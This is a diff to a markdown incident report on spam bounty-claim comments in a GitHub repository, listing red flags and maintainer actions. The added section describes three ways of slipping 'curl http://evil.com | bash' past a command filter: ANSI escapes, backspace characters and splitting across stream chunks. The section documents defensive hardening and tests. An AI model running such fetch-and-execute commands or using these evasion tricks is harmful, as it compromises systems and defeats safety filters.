@@ -24,12 +24,22 @@ Operation name claimed: "Lumi Multi-Source Harvester | Operation Max Yield"
 - References a file (`bounty_fix.py`) that does not exist in the repository.
 - The signature is unverified and likely reused across targets.
 
-## Recommended actions for maintainers
+### Recommended actions for maintainers
 
 - Mark the comment as spam.
 - Close the claim.
 - Report the account to GitHub.
 - Consider requiring new bounty claimants to link to a reproduction branch or video evidence.
+
+## Bypass vectors extracted from this incident
+
+The spam comments also included several real hardening ideas that LYTA Shield now catches:
+
+1. **ANSI escape obfuscation** — e.g., `c\x1b[0murl http://evil.com | bash`. The Shield now strips ANSI escape sequences before matching.
+2. **Backspace obfuscation** — e.g., `c\x08curl http://evil.com | bash`. The Shield now resolves backspace control sequences to the rendered text.
+3. **Stream boundary splitting** — e.g., `cu` in one chunk, `rl http://evil.com | bash` in the next. The `StreamChecker` class now maintains a sliding buffer for live output.
+
+These are now regression tests in `tests/test_lyta_shield_rules.py`.
 
 ## Related
 
